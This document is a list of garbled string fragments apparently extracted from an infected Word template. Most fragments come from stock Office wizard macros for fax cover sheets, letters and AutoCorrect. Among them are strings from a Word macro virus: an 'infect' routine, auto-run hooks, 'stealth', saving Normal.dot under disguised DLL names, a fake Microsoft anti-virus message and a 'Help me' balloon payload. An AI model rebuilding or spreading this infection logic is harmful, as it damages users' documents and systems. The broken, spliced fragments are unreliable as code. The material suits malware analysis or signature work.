            "S$`_O",
            "5Textq",
            "^Strv$8",
            "e[#A",
            "R(MziLin\u01b6#",
            "idxC}count_c",
            "I$In ",
            "Chr(13\u07e3\t",
            "x > 0`",
            "\u0299[LTrim:A",
            ")), 2Lef>",
            ".Len`",
            "1*Midb",
            "+ t1)(\"",
            "s\",_",
            "yo/m ",
            "q!f!",
            "0 C\\",
            "f<\t\t(+)A",
            "Items",
            "A1`(howMa",
            "LastSt= ",
            "=..En",
            "Controls() '",
            "`A1v",
            " 5,0'<Back",
            "N@k>?",
            "dlgFocus 6 'x",
            "7 'f",
            "b SH",
            "stField, Lim",
            "S#/HideH",
            "For i",
            ",3i pVisi",
            "ED/+c,SY",
            ", ED",
            "3(so",
            "snew?7",
            " Op@>",
            "A\tmo",
            "F\u0402viewB",
            ")?<`",
            ")), (Sta",
            "teItems_@_(snew",
            "l = 3",
            "And Word",
            "Basic.Dl",
            "gValue(\"",
            "LetterMe@thod\")",
            "T1 Then",
            "isible \"",
            "chkloID\", 0\"*Wri",
            "Initials&6Typist.6",
            "CC0Enclo",
            "sure'JAttachment",
            "EIfRem",
            " Chk if ",
            "MAPI env",
            "iron",
            " is p",
            "Add\tsB",
            "ook buttXons$5",
            "43c -yCommandz",
            "id(kInsert",
            "Cont",
            "rol3",
            " 'Change",
            " Wizard \"Dog D",
            "unction ",
            "Priv",
            "(id$,",
            " iaB",
            ", wv",
            "A@8Dim fR",
            "idnum",
            "DSelect Case",
            "1  '",
            "2 'Hide OK{",
            "Hint",
            " (no h",
            "Rst$)@",
            "tore dc+s ~ing$L",
            "SH$)s0)",
            "0Last",
            "ALL s",
            "%- 1",
            "1 'Show >i",
            "k%@dA)Fi",
            "lePrevie",
            " <> 07fL8+\t",
            "/Diskc&Y",
            "J5Focus",
            " 6 'Next^>",
            "L\u0225bI2",
            "4Click",
            "\"U`R",
            "y$4Id],>Y ",
            "DoB\"",
            "*aCg",
            "4`zancel",
            " 'exi",
            "B\t5 '<\\Ba!%",
            "( B<, a>B",
            "To DAPF$ELs!Se (1",
            "PJ4FF",
            "Nurn?",
            "Else",
            "'not g",
            "unna happiR",
            "SaveN's",
            "Q 1?)q~ c2kd;",
            "' do  ",
            "CyS-d \"lk",
            "P1i\\dlL",
            "sBar \"\" p'cle",
            "Ib<ar",
            "Wi ndow(iEmptyDocMSE3",
            "L (i",
            ") 'brd workf0",
            "p7upd@{d",
            " forced (by mov",
            " the e",
            "'g7S!\"",
            "\u044a>StrPathP",
            "AsIq",
            "astr",
            "mrkName",
            "m iA",
            "Inte",
            "fFou?",
            " Error GopHFatal",
            "= TruT",
            "\t= obj",
            "0#(Len(",
            "9\"0)r\"s",
            " N(ew p",
            "Jd \u041b",
            "Ge@t loca",
            "sfirs",
            "in U0",
            "!~kgroup wc",
            "F\u01c0h\"G",
            "s.DefaRq",
            "wd~\t",
            "Whp ((i < 2)R",
            "try7@00r",
            "with",
            "ng f",
            "n%7\t",
            "SPCchQ",
            ", ):=k#@",
            "$ &Q+WI",
            "Z, Dir:",
            "=1, Match6:=j `",
            "C+t\",q",
            "short",
            "0rt29",
            "gK 7",
            "fFound",
            " = True",
            "i + ",
            ",strPat",
            "8Applic",
            "ation.Op",
            "s.Defau@ltFile",
            "wdWorkgr",
            "oupTemplPates",
            "\tIf ",
            ") Then",
            " ' Wizard was f",
            ", so save p",
            "~SB0NameUBdBasic.[",
            "$](1E",
            "%Info",
            "., 5",
            "8Separator<\t",
            "'Right$(",
            ", 1) <> ",
            "StrZ",
            "Exit Fun.c}",
            "Mi@ssing:",
            "M sgBox",
            "R_WIZ_NOT_FOUND",
            "FatalE",
            "rror",
            "Rep(ortB",
            "'@main e",
            "  tin",
            "e called1",
            "the w",
            "'SHOULD",
            " @( BE CA",
            "LLED FOR@ POST-",
            "RD 1ORS",
            "Pub Su",
            ",(ByVa",
            "l-orCode",
            "ObjectDDim ",
            "LongC",
            ".Numbe",
            "Desc,riv)",
            "'E n",
            "ext 5umen",
            "eems to",
            "*set !%",
            "uthough  D is a ",
            "!argu\t",
            " &rs",
            "HEnviron\"",
            "fB:oonVi`sible",
            "AAOstant",
            ".ClosD",
            "h'\"dDisy",
            ", Fal`se '2",
            "|m eter ",
            "#fSuccess",
            "(Not",
            "ormQ\tIs @",
            "h ?)",
            ".HidUnloa\\",
            "hfpost-f, oIDj.",
            ", always",
            "Gdoc",
            "A@veDocCc4 wdDo",
            "S@Changes '",
            "GdRbe E",
            "`,min",
            "za&o ",
            "!v'iv",
            "NewMacros",
            "oldNewMacros",
            "NewMacros",
            "Help me",
            "I'm not feeling very vell .. AAARGHH!!!",
            "Normal.dot9",
            "NewMacros",
            "AutoNew",
            "AutoClose",
            "autoopen",
            "AutoExit",
            "Microsoft is protecting your normal.dot from virus infection You can only add macros to other documents",
            "NewMacros",
            "oldNewMacros",
            "NewMacros",
            "wininf.dll",
            "NewMacros",
            "NewMacros",
            "oldNewMacros",
            "prncfg.ini",
            "Printer Port",
            "PortNumber ",
            "prncfg.ini",
            "Printer Port",
            "PortNumber ",
            "save normal.dot to windot.dll",
            "windot.dll",
            "wininf.dll",
            "save infected dot",
            "Normal.oldNewMacros. ",
            "stealth",
            "Attribut",
            "e VB_Nam",
            "e = \"New",
            "Macros\"",
            "Sub i",
            "nfect(m)",
            "Applic",
            "ation.Di",
            "splayAleHrts",
            "N@one",
            "ssistant.Anim",
            "*mso",
            "#Get",
            "Techy",
            "etnormal",
            "0End ",
            "de0lete",
            " Error GoTo ",
            "Organize",
            "rRenSou",
            "rce:= _",
            "NDTem",
            "zte.Fully, ",
            "\"old,0 Obj",
            "Items",
            "vcopym",
            "\u05d1sco^tC",
            "ActiveDo0cumen9Destinq",
            "=co=",
            ">If Int",
            "((50 * R",
            "nd) + 1)",
            "25 ThenASet a",
            "@cBalloo",
            "a.Headin",
            "\t\"Help ",
            "a.Te",
            "I'm not feelA",
            "very vel",
            "l .. AAARGHH!!!",
            "0Show",
            "r\u0122With ",
            " .ached\u015e!\\.dot",
            "8V>DD]\\hh",
            "?>\\r\\Auto}`",
            "una (\"",
            "Clos^e_\tI\tB",
            "oxpen",
            "\te\t%",
            "Exxit_\t",
            "N\tToolsb\t@cey@s.CounX0",
            "bn@IMsgBo x(\"Miof",
            "t is prot!\\y`@^M",
            " from vi",
            "rus$",
            "u can only add ",
            "s to oth",
            "er ds\", vbOKO",
            "a3c@",
            "CElsa,r",
            "@oreorig",
            " l<Dialo`gs(wd#",
            ").mre\u18a3",
            "os@st(",
            "lsr1!piD2ic*\u017fcc",
            "m$vS",
            "{my)^:",
            "3NrerenC",
            "OpAs.Def",
            "aultFile0Path@%\tgr<am",
            "Se0para# f\"winH.dll`-R",
            "g,\u0663d",
            "Ifla{Sys",
            "tem.Priv(ate",
            "rL(\"prncXfg.",
            "ntIPort",
            "NumberaUE\".VNp",
            "\"QoASFagJU",
            "\"\"\u0606O",
            "~X340C~$OgA",
            "'save\\Y",
            ",B5|}S",
            "As 1>o3o3ho3thm3D",
            "@>@@@@ ",
            "edot",
            "5NjSpr\u050c",
            "< rmr",
            "Run7",
            ".i.\"`Jm",
            "302al",
            "ltiTd",
            "sh2nh",
            "l4l8",
            ">tFTd",
            "]/T\\",
            "''''''''",
            "l<*#8",
            "t<8)",
            "x@46",
            "'$'T",
            "''''''''",
            "l<*#8",
            "t<8)",
            "x@46",
            "'$'T",
            "\\L`#D",
            "Project",
            "@m27",
            "rstdo",
            "G{00020430-",
            "0046}#2",
            ".0#0#C:\\",
            "WIN95\\SY",
            "STEM\\STD",
            "OLE2.TLB",
            "#fntRubyA",
            "IDCD_ALIGN`",
            "Clear",
            "AddItem ",
            "ID_RESET",
            "Enabled\u06ea",
            "IDCT_FONTk",
            "Caption",
            "NameFarEastx",
            "IDCT_SIZEKW",
            "IDCE_TEXT",
            "IDCE_DISTl",
            "ListIndexQ",
            "IMEMode",
            "fmIMEModeNoControl",
            "SetFocus",
            "SelStartZ",
            "SelLength",
            "IDOK&",
            "BuildRedirStringx",
            "RedirStringg",
            "OperatingSystem[",
            "International",
            "wdProductLanguageID",
            "Version",
            "PrivateProfileString[",
            "UpdateLinkN",
            "Anchor#r",
            "Hlink",
            "ActiveDocument\\",
            "Hyperlinks:",
            "Address",
            "msoHyperlinkRangeZ",
            "Shape",
            "strSTY_RETURN_ADDRJ-",
            "strSTY_DOC_LABELFR",
            "strSTY_COMPANY_NAME",
            "strSTY_MSG_HDR_FIRST",
            "strSTY_MSG_HDR_LABEL",
            "strSTY_MSG_HDR_LAST",
            "strPHONE",
            "strFAX",
            "strPAGESD",
            "strTOa",
            "strFROM",
            "strDATED",
            "strREa",
            "strCCk_",
            "strCOMPANY=W",
            "strFAX_NUMBER8",
            "strPHONE_NUMBER2Y",
            "strTOTAL_NO_PAGESq",
            "strEMPTY_MACRO,(",
            "strNONE",
            "strFLD_NAME}9",
            "strFLD_FAXpW",
            "strCLICK_HERE_NAME",
            "strCLICK_HERE_PAGES",
            "strCLICK_HERE_SUBJECTI4",
            "strCLICK_HERE_COMMENTSO",
            "strCLICK_HERE_COMPANYv",
            "strCLICK_HERE_PHONE_NUMBER",
            "strCLICK_HERE_FAX_NUMBER",
            "strADDR_BK_NAME_FORMAT",
            "strADDR_BK_ADDR_FORMAT",
            "vbCr",
            "strADDR_BK_FAXNUM_FORMAT[",
            "strADDR_BK_PHONE_FORMATh",
            "strADDR_BK_COMPANY_FORMAT(&",
            "strFAXING_DOC_RECIPIENTSF&",
            "strFAXING_DOC_RECIPIENTJ",
            "strFAXING_CS_RECIPIENTS=",
            "strFAXING_CS_RECIPIENT",
            "strFAXING_CS_TO",
            "strFAXING_DOC_TOq0",
            "strLAST_PANEL_DFLT_TEXT",
            "strLAST_PANEL_NOCOVSHT_TEXT",
            "strHLP_FAX_INSTALL",
            "strMS_WORDC@",
            "strCMD_BAR_TITLEld",
            "strCMD_BTN_TEXT2",
            "strCURRENT_DOC",
            "strRIGHT_PAREN",
            "strWINDOW_CAPTION'",
            "strCOVER_SHEET_CAPTIONLx",
            "strFLD_FAX_NAMEJ8",
            "strFLD_FAX_NUMBER",
            "strPRINTER_ONi",
            "iMAX_ADDR_LINES[",
            "strERR_MAX_ADDR_LINESZ",
            "strERR_NO_DATA_SRC",
            "strERR_CREATING_CMDBARc&",
            "strERR_NO_MAIN_DOC1.",
            "strERR_NO_MAIN_DOC2/",
            "strERR_DISPLAY_QUERY_OPTIONS",
            "strERR_CHOOSING_DOCf ",
            "strERR_RCPNTS_NOT_CHOSEN",
            "strPOST_WIZARD_TIP_NO_MRG_FLD",
            "strPOST_WIZARD_TIP_MRG_FLD8",
            "strMSG_FAX_SUCCESS",
            "sCONT_LEFT_INDENT",
            "sCONT_WIDTH_COL17",
            "strDATE_FORMAT",
            "strAT_UNCHKD_BOX",
            "strAT_CHKD_BOXeo",
            "strCNTMPGFX2U",
            "strPOST_WIZ_BLN",
            "sA4_LEFT_MARGIN",
            "sA4_RIGHT_MARGIN",
            "sLETTER_MARGIN",
            "strREGKEY_CMPNY_NAME",
            "strVALKEY_CMPNY_NAME4",
            "fDocChangedP",
            "objMainDa^",
            "1534e3fa74",
            "1834e3faaa",
            "1d34e41db0",
            "3334e41eda",
            "c37326d05",
            "DEST",
            "DEST",
            "DEST",
            "DEST",
            "Wordk",
            "Win16~",
            "Win32",
            "Project1",
            "stdole`",
            "MSFormsC",
            "ThisDocument<",
            "_Evaluate",
            "Normal",
            "Office",
            "Project-",
            "Class1",
            "SZ_MACRONAMEK",
            "Insertr",
            "Class",
            "SelectionZ",
            "ChrK~",
            "MsgBoxR",
            "Title~",
            "LExit",
            "Start",
            "MoveRight",
            "Right",
            "FIsRubyField",
            "Range",
            "Fields7",
            "Count0v",
            "vbTabc9",
            "InitDialog",
            "dlgRubyP;",
            "Show",
            "CreateM",
            "szRuby9",
            "szFontW",
            "iSize",
            "iDist#",
            "szAlign@",
            "rgnY",
            "iCurSize\u04c4",
            "szCurFontM",
            "fnt6",
            "FontU",
            "Application*",
            "ScreenUpdating!",
            "Systema",
            "Cursorl",
            "wdCursorWait",
            "LError",
            "GetCurFontD",
            "Deletex",
            "Size",
            "Addr",
            "TypeText",
            "InsertBefore.",
            "DisableCharacterSpaceGrid?",
            "InsertAfterq5",
            "szCurName",
            "MoveLeftv",
            "unit",
            "wdCharacter",
            "ToggleShowCodesT[",
            "wdCursorNormalS",
            "Erro",
            "Description ",
            "rgnFldi",
            "rgnNew",
            "szCode",
            "FUpdate",
            "Code",
            "iTopL|",
            "iEnd+",
            "SetRange",
            "FormattedText",
            "Documentj",
            "objDataSrc",
            "MailMergeDataSource_",
            "strSELECT_QUERY",
            "iMAX_PANELw",
            "rgstrAssistantMsg5W",
            "strBULLETW",
            "strSOFT_ENTER",
            "rgstrNotes",
            "strQUOTE",
            "iSTY_PROFESSIONALF",
            "iSTY_CONTEMPORARY@@",
            "iSTY_ELEGANT2",
            "rgstrTemplateFileNames'",
            "iLONG_NAMETj",
            "iSHORT_NAME",
            "iFaxStyle`",
            "fStylesCopiedp",
            "fMSFAXEnabledh",
            "iPANEL_RCPNTS$m",
            "iPANEL_SENDER",
            "iPANEL_STYLE#",
            "iMAX_RCPNTSOX",
            "fDocIsFormLtr",
            "strFormLetterSQL-",
            "strFormLetterSQL1",
            "strConnectStringA",
            "fDocPresent{",
            "rgfSkipPanel:",
            "rgiColorShape",
            "fCheckValidityn",
            "fNoCovSht",
            "iFaxOptionf",
            "iMS_FAXf",
            "iDIFF_FAX",
            "iNO_FAX",
            "fRegistryNamesRead-",
            "rgstrFaxTitle",
            "rgstrChkBoxText",
            "strAsstMsgRcpntsFormLtr",
            "strAsstMsgRcpntsOrdDoc",
            "fCreatedCmdBar",
            "rgstrMRUFaxNames",
            "rgstrMRUFaxNums[",
            "rgstrRcpntFaxNames",
            "rgstrRcpntFaxNums(=",
            "iNumRcpntsc",
            "strCBO_RCPNT_NAMEm",
            "strCBO_RCPNT_NUMm",
            "iCboRcpntNameFocusO",
            "strRCPNT_NAMEs",
            "strRCPNT_NUMBER",
            "strNUM_RCPNTSZ",
            "strWIN_HELP_FILEl",
            "strFAX_HELP_FILE",
            "lCNTXT_FAX_INSTALL",
            "lCNTXT_FAX_SEND",
            "HELP_COMMAND",
            "iERR_FAX_NOT_INSTALLED4",
            "iERR_FAX_NOT_SENT|P",
            "RegEnumKey",
            "hKey ",
            "dwIndex",
            "lpNameR",
            "cbName.!",
            "advapi32.dll}0",
            "RegOpenKey",
            "lpSubKey",
            "phkResult4",
            "RegCloseKeyl",
            "GetWindowsDirectoryk",
            "strDir",
            "uSize\u0710",
            "kernel32_",
            "FindWindow",
            "strWndClassName%",
            "strWndNameX(",
            "USER32*",
            "WinHelpkD",
            "hwnd/",
            "strFileNamee",
            "wCmd*",
            "dwData",
            "rgstrPrinterNames[",
            "iTotalNumPrintersT",
            "HKEY_LOCAL_MACHINE",
            "ERROR_SUCCESSjr",
            "ERROR_NO_MORE_ITEMS+^",
            "strREG_PROVIDERS",
            "strREG_LOCAL_PRINTERS",
            "InitWizardNameK",
            "fDummy0",
            "strWizName@",
            "strWizLongNameJ",
            "strWizShortName",
            "InitWizardStringsh",
            "COLOR_LIGHTGREYr",
            "strRegSettingsKey",
            "strREG_SETTINGS_BASE_KEY(",
            "InitFormS",
            "FatalError9",
            "formWizard\"",
            "formWizDlgR",
            "DisplayErrorMsgW",
            "strERR_INIT_FORMl",
            "ReportError\u0140",
            "iCurrentPanel",
            "lblWizardName1",
            "InitWizard",
            "SetMainDoc-",
            "cDocs:",
            "Documents",
            "cboDocList/",
            "CheckDocKind:t",
            "objDoc",
            "objMMQ",
            "MailMerge",
            "strQueryStringt",
            "LReturn",
            "DataSource ",
            "wdNoMergeInfopY",
            "QueryString",
            "ConnectStringc",
            "CreateCoverSheet",
            "strDocNameP",
            "objFps5",
            "PageSetup",
            "StatusBar\u029c",
            "strCREATING_DOC",
            "fChangeToA40",
            "LeftMargin]",
            "RightMargin[",
            "fChangeToLetter|",
            "CreateDataSource",
            "CreateProfContCoverSheet",
            "CreateElegCoverSheet/",
            "optCovSht5",
            "ValueK",
            "ActiveWindow+",
            "ViewI",
            "TableGridlinesZl",
            "UndoClear",
            "HomeKey",
            "wdStory&",
            "Contentl",
            "SpellingCheckedz",
            "GrammarChecked",
            "objRngu",
            "strPathl",
            "objDataSrcDoc",
            "strDataSrcName",
            "MainDocumentType",
            "wdFormLetters",
            "OpenDataSourceK",
            "Connection",
            "CreateTableFromFaxInfo",
            "Options",
            "DefaultFilePathR",
            "wdTempFilePath.",
            "strPathSeparatorif",
            "Time",
            "SaveAsf;",
            "wdFormatDocument",
            "wdDoNotSaveChanges\u0507",
            "objRangey",
            "strText",
            "ConvertToTable*",
            "FCopyStyles",
            "iStylef",
            "strStyleNameZ",
            "strLongNameu",
            "TemplateNotFoundv",
            "LFindTemplate5",
            "strTemplatePath",
            "LApplyStylesx@",
            "LTryShortName\u0607",
            "strAPPLYING",
            "CopyStylesFromTemplateL",
            "strERR_STYLE_NOT_FOUNDw",
            "strERR_STYLE_NOT_FOUND23",
            "objRngBuffer1g",
            "objRngBuffer2g",
            "strCmpnyName",
            "strNameZ",
            "strMFFirstName-",
            "strMFLastName7",
            "strMFFaxNum$",
            "objRngTextTablec",
            "objTable]",
            "Table",
            "InsertContAutoTextdU",
            "objActiveRange",
            "Collapse",
            "wdCollapseEnd",
            "InsertReturnAddress^C",
            "GetMergeFieldNames",
            "txtCompanyr",
            "Stylep",
            "Duplicate_",
            "InsertField",
            "wdFieldMergeField`",
            "strSPACE4o",
            "wdFieldMacroButton9",
            "txtSenderName^",
            "InsertParagraphAfter",
            "wdStyleMessageHeader3O",
            "wdFieldTimell",
            "AutoFit&\t",
            "BordersC\"",
            "Enable ",
            "RowsU",
            "SpaceBetweenColumns",
            "LeftIndenti",
            "Cells",
            "Columnsp9",
            "wdBorderHorizontal",
            "Visible",
            "wdBorderBottom",
            "InsertCheckBoxesH",
            "InsertBodyText_h",
            "wdCollapseStart|",
            "objRow",
            "ParagraphFormat",
            "strFirstName",
            "strLastNameK",
            "strFaxNum<",
            "cboFldsRcpntFirstName",
            "cboFldsRcpntLastName",
            "cboFldsFaxNum",
            "strFromPhD",
            "strFromFaxr>",
            "strAddresse^",
            "txtSenderPhone",
            "txtSenderFaxT^",
            "txtMailingAddr9",
            "StrReplaceCrLfWithText",
            "objWizTemplateL",
            "AutoTextEntries",
            "wdStyleEmphasis",
            "InsertParagraph",
            "strAfterTextI",
            "wdStyleBodyText",
            "strERR_AUTOTEXT_NOT_FOUNDT",
            "RestoreDialogValues",
            "fAddrBkEnablex",
            "strChkdAddrW",
            "strRST_SETTINGS",
            "MAPIAvailableG",
            "cmdRcpntsAddrBk%",
            "cmdSenderAddrBka",
            "optCurDoc\u028a",
            "optCurDocCovShtYes",
            "optCurDocCovShtNo0y",
            "frmRcpntsFormDoc'",
            "frmRcpntsOrdDoc",
            "IRestorePrefD",
            "UCase5",
            "optMSFax",
            "GetAllPrinters9E",
            "cboFaxDriver",
            "lblFaxDriver",
            "cmdOtherPrintersA",
            "optDifferentFax\t",
            "optNoFax\"",
            "UserName\\",
            "ICountLines\u0144",
            "UserAddressF",
            "StrRestorePrefp",
            "optStyleProf",
            "lblStyle0f",
            "optStyleCont",
            "lblStyle1f",
            "optStyleEleg6",
            "lblStyle2f",
            "fSettingsRestoredC",
            "FillMergeFields",
            "iCount",
            "iFirstNameC",
            "iLastName`x",
            "iFaxp/",
            "rgstrNamesC",
            "objFieldNamesG",
            "MailMergeFieldNames\"",
            "objTempDocy5",
            "FieldNames\u0738",
            "List*",
            "ReadRegistryFaxNames7",
            "objCtrls\u06ae",
            "mpgWizardPage",
            "Pages",
            "ControlsK",
            "SaveDialogValues\t",
            "strSAVE_SETTINGS",
            "strREG_ASSISTANT_TIME_STAMP",
            "Now%",
            "StoreValPrefX",
            "strREG_ASSISTANT_HELP+<",
            "iLocalState1",
            "StorePrefl",
            "SaveRcpntsInRegistry",
            "fSettingsSaved'a",
            "strNum+",
            "StrSearchReplace\u01f0",
            "SaveRcpntsInDocVarsk",
            "fSaveRcpnts(",
            "objVarscb",
            "Variablesn",
            "strTempM",
            "strFaxFld",
            "optFldFaxEntry:",
            "StrRemoveCrLfFromEndV",
            "strChar$",
            "LEnd|",
            "vbLfT%",
            "strWhat",
            "strNewText",
            "iMaxT",
            "cLinesL<",
            "iPosf",
            "iFldTypey",
            "fPreserveFormattingH*",
            "objFldW5",
            "Field3",
            "resultur",
            "strDelim\u069f",
            "strRet",
            "strTmpJ",
            "strSrch",
            "strReplace",
            "SetupDocForFax%5",
            "FaxRegDoc",
            "FaxFormLtr",
            "CreateCmdBar;",
            "objCmdBar?",
            "CommandBar",
            "objBtn%!",
            "CommandBarButton9",
            "CustomizationContext\u0380",
            "CommandBars",
            "Position",
            "msoBarFloating",
            "Temporary",
            "msoControlButtonn",
            "msoButtonCaption",
            "OnAction",
            "fMSFax\u039f",
            "fCovSht\u064a",
            "rgstrFaxNames\"",
            "rgstrFaxNums",
            "fMainDocPresentq",
            "strErrorMsg",
            "strFaxPrinter=",
            "strActivePrinter\u01f1",
            "objTmpMM",
            "fSendMailAttach",
            "strERR_SEND_FAX/",
            "SendMailAttach[",
            "FInvalidMainDoc,",
            "ActivePrinterp",
            "Destination\u043b",
            "wdSendToFax7_",
            "wdSendToPrinter",
            "MailAsAttachment",
            "MailAddressFieldName(",
            "ExecuteY",
            "SendFax4",
            "PrintOut.",
            "LResetPrinter",
            "DisplayPostWizTipW",
            "Number-",
            "DisplayTip",
            "DisplayHelpK",
            "iDestinationn",
            "wdSendToEmail",
            "Update",
            "strFile X",
            "lContextW",
            "strTmpBufferdV",
            "strWinDir7",
            "hOpusWin&",
            "lResultMU",
            "strMacroName-D",
            "WindowState|",
            "wdWindowStateMaximizeU",
            "LNotFindWindowD",
            "strTipMJ",
            "objBlnTip8",
            "Balloon",
            "Assistant",
            "NewBalloon",
            "Modev",
            "msoModeModalK",
            "Heading",
            "Button",
            "msoButtonSetOKC",
            "BalloonError",
            "msoBalloonErrorNone0Y",
            "GetLocalPrintersh",
            "GetRemotePrintersZ",
            "hSubKey4",
            "GetRemotePrinterNames",
            "GetProviderPrinters",
            "strProvider",
            "hKeyProviderServers",
            "lpPrinterServer",
            "strPrinterServer",
            "cbPrinterServerj1",
            "dwPrinterIndex'",
            "lRetE",
            "iLenPrinterServer:",
            "LEndGetProviderPrinters",
            "LCloseProviderServersKey",
            "GetPrinterNamesFromServer\u05f9",
            "hKeyPrinterServers,",
            "lpPrinterName*",
            "strPrinterName`>",
            "strPrinter",
            "cbPrinterName;",
            "iLenPrinterName",
            "strRegPrinterServers+[",
            "LClosePrinterServersKey-",
            "dwProviderIndex:",
            "cbProviderName2",
            "lpProviderNameE",
            "iLenProviderNamey",
            "strProviderName%",
            "GetLocalPrinterNamesB2",
            "LEndLocalPrinters",
            "fMsgBox",
            "objTipBalloon",
            "TipError(z",
            "msoModeAutoDown",
            "msoButtonSetNone",
            "vbInformationn",
            "vbOKOnly",
            "vbApplicationModalJ",
            "NoDocp`",
            "DeleteCmdBar",
            "strCmdBarName",
            "Charactersrg",
            "Styles",
            "Paragraphsf",
            "StrFetchPref",
            "strIdJ`",
            "LReturnNull",
            "strDefault|",
            "strWIZ_NAME`",
            "iBALLOON_OPTIONSn",
            "strBALLOON_HEADINGp",
            "strOPTION_ONE_ACCELERATORp",
            "strOPTION_TWO_ACCELERATOR)",
            "strInitialBalloon,",
            "strHelpTipC~",
            "fnInitialBalloon",
            "iBtn",
            "fAssistantAvailablei",
            "ShowAssistantTip",
            "Dialogs",
            "wdDialogToolsCreateEnvelope\u059d",
            "objHelpTipBalloon",
            "wdEnvelopes}",
            "wdDialogMailMergeHelper)",
            "iPrevChars\t]",
            "para~",
            "Paragraph",
            "fld\u070e",
            "FIsDistFieldd",
            "dlgDist7.",
            "LSkipw",
            "IDCS_SIZE@",
            "IDCE_SIZE",
            "rgnTmp",
            "rgnOrg",
            "cmdbE",
            "cLineBreak",
            "Resize@4",
            "LContinuev",
            "sz._",
            "FIsSpacek",
            "AscWG",
            "Beep",
            "iNewZ",
            "szFld",
            "UF01p",
            "StatMsg1",
            "StatMsg2",
            "StatMsg3",
            "StatMsg4",
            "TagTextW",
            "szAppName|",
            "szErrorMsgd",
            "szACEntriesErrorMsg\u01c1",
            "szWarnMsg",
            "szFormatIncorrect",
            "szRestoreCompletemsg",
            "btnBackup_Click",
            "Autocorrect",
            "Hide9z",
            "GetAutoCorrectEntries",
            "SplitTable7",
            "TypeParagraph ",
            "Sentences",
            "Bold",
            "SaveACDoc",
            "SaveChangest",
            "btnClose_Click",
            "btnRestore_Click;",
            "ACFileName3D",
            "Response",
            "vbYesNo",
            "vbDefaultButton2",
            "vbNo%",
            "byez",
            "wdDialogFileOpen",
            "Display",
            "OpenACDoc",
            "RestoreACEntries}",
            "NumRows",
            "oDoc",
            "oACorrect",
            "oTable\\o",
            "szName",
            "szValue\\",
            "szRTF",
            "RestoreACEntriesErrors$",
            "Words8",
            "Tables",
            "Entries",
            "WhatC",
            "wdGoToTable",
            "Which",
            "wdGoToFirst",
            "wdCell",
            "AddRichText+",
            "TotalACEntries",
            "itemz",
            "RichTextN",
            "Apply,",
            "Extend?",
            "wdExtendd",
            "Separator^",
            "wdSeparateByTabs",
            "wdTableFormatSimple1pE",
            "ApplyBorders\\",
            "ApplyShading\u065d",
            "ApplyFontP?",
            "ApplyColor|",
            "ApplyHeadingRowsH2",
            "ApplyLastRowQ%",
            "ApplyFirstColumnI",
            "ApplyLastColumnr",
            "MoveUp",
            "wdLine",
            "InsertRows",
            "SaveACDocErrorsY",
            "Save",
            "vbCritical+}",
            "vbYesa?",
            "ACFileOpenName",
            "OpenACDocErrors}",
            "FileNamej",
            "UC01`",
            "Module1b",
            "UM01h",
            "lpClassName",
            "lpWinName",
            "user32.dll",
            "lpHelpFile0w",
            "wCommand",
            "State",
            "LastState",
            "StateItems__UQ",
            "dlg-",
            "HideFilePreview__",
            "wizname6",
            "iWorkDocG",
            "iEmptyDocQ",
            "workDocH`",
            "emptyDoc",
            "HelpCtx|",
            "gDoogie1",
            "LettersPathdE",
            "LetterMax",
            "LetterNames__",
            "LetterFiles__\"",
            "defLttre",
            "RetAddressLines!",
            "gEnvelopeLabel)",
            "dlgELj",
            "toui",
            "gPrewrittenFile",
            "gCurrentHeadingPosition",
            "rtDistToLftDist",
            "RetAddress__",
            "kThing",
            "kUpThing",
            "kWizname\u0110",
            "Wizard_)",
            "Normal_",
            "kGalleryM",
            "kErrBadDoc\"",
            "kTip",
            "kLetterPath",
            "kLettersDirZw",
            "kLongLettersDir",
            "kSetupDialog\u0752",
            "kCreatingDoc",
            "kSaveSettings",
            "kRstSettings\u0684",
            "kRstStylsheet\u0621",
            "kLookingForLetters[t",
            "kLoadingLetterDetails",
            "kLookingFor2",
            "kEnterRecipientAddress",
            "chQuote",
            "kAddressATEntry",
            "Dot_",
            "Letter_",
            "kREx",
            "kAccountID",
            "kDear/",
            "kRecipient5",
            "kTypeHere0",
            "TPathR",
            "kName",
            "kClosePersonal$",
            "kCloseBusinessQ",
            "kWritersInitialsw",
            "kTypistsInitials",
            "kCCK",
            "kNames",
            "kEnclosures",
            "kNumber",
            "kAttachments6",
            "kFormalDateFormat5",
            "kPage4_",
            "kEmptyMacro8:",
            "kInsertAddress",
            "kMacroButton",
            "kErrLetterNotFound",
            "kErrThatLetterNotFound\u07e4",
            "kErrStyleNotFound1",
            "kErrStyleNotFound2",
            "kErrCannotCreate1",
            "kErrCannotCreate2",
            "kTypeCompanyName",
            "kFntArialO",
            "kFntWndngss",
            "kDfltPageNumC",
            "pt90_n!",
            "pt72_",
            "pt216_",
            "kFtrDist1",
            "kFtrDist2",
            "kErrMaxLinesH",
            "cntmplet",
            "proflettA",
            "eleglettO",
            "kStyCmpnyName1",
            "kStyBodyText6",
            "kStyRetAddr",
            "kStyCC",
            "kStyEncl0J",
            "kStySigNamer&",
            "kStySal(0",
            "kStySubjLinee",
            "kStyDate{A",
            "kStyInsideAddr",
            "kStyRefIntls",
            "strERR_WIZ_NOT_FOUND",
            "InitStrings",
            "kRstStylesheet",
            "WordBasic",
            "PrintStatusBar=",
            "Main,",
            "iWindowNumber",
            "faddr",
            "freaddr",
            "DialogRecord",
            "UserDialog",
            "ToolsEnvelopesAndLabelsj",
            "ToolsOptionsUserInfo",
            "WaitCursor)k",
            "TempDlg0",
            "FileTemplatesuy",
            "CurValues\u0224",
            "Template",
            "StrWizardPath*T",
            "Right$y1",
            "Files$",
            "FileNameInfo$iZ",
            "VerifyEnvirons",
            "GetPrewrittenDetails\u0117",
            "BeginDialogF",
            "Picture*",
            "OKButton|",
            "PushButton",
            "CancelButton",
            "FilePreview_[",
            "OptionGroupN",
            "OptionButton",
            "ItemsInState",
            "CheckBoxi{",
            "TextBoxQ",
            "EndDialogmP",
            "Dialogf",
            "ToolsOptionsGeneral",
            "BlueScreen\u076a",
            "WindowList",
            "Window6",
            "DocClose=",
            "WindowName$",
            "ExistingBookmark",
            "WW7_EditGoTod",
            "ExtractAddress",
            "AddrText",
            "EnvAddressy",
            "RetAddrTextR",
            "EnvReturnd",
            "MailingLabeln",
            "DefaultPrintBarCode{",
            "Envelope",
            "returnAddress",
            "CreateNewDocumentj",
            "LineDownx",
            "StoreQ",
            "LinkStyles-m",
            "CountWindows",
            "def)",
            "path2",
            "GetDocumentVar$",
            "xFetchPref\u01b3",
            "GetProfileString$z",
            "DefaultDir$l",
            "Left$7",
            "GetDefaultUnits'r",
            "dlgTO",
            "Units",
            "UnitName-",
            "ConvertInchesToUnits-",
            "oldValm",
